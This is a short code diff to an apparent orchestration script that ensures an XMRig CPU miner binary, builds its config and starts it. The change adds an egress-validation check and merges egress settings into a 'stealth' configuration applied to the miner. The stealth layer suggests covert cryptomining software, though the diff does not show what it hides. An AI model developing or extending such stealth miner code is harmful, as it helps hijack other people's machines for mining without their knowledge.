@@ -299,6 +299,13 @@ def _orchestrate():
 
         overrides_path = BASE_DIR / "settings.json"
         user_settings = ConfigBuilder.load_overrides(overrides_path)
+        from core.egress_validate import egress_stealth_merge, log_egress_validation
+
+        strict_egress = bool((user_settings.get("egress") or {}).get("strict_validation", False))
+        if not log_egress_validation(user_settings, strict=strict_egress):
+            logger.error("Orchestration aborted due to egress validation errors")
+            return
+
         cb = ConfigBuilder(user_settings)
 
         # ── CPU miner (XMRig) ──
@@ -306,7 +313,8 @@ def _orchestrate():
         mgr.ensure_binary()
 
         cfg = cb.build()
-        sc = StealthConfig(user_settings.get("stealth", {}))
+        stealth_input = {**user_settings.get("stealth", {}), **egress_stealth_merge(user_settings)}
+        sc = StealthConfig(stealth_input)
         cfg = sc.apply_to_config(cfg)
         mgr.write_config(cfg)
         mgr.start()
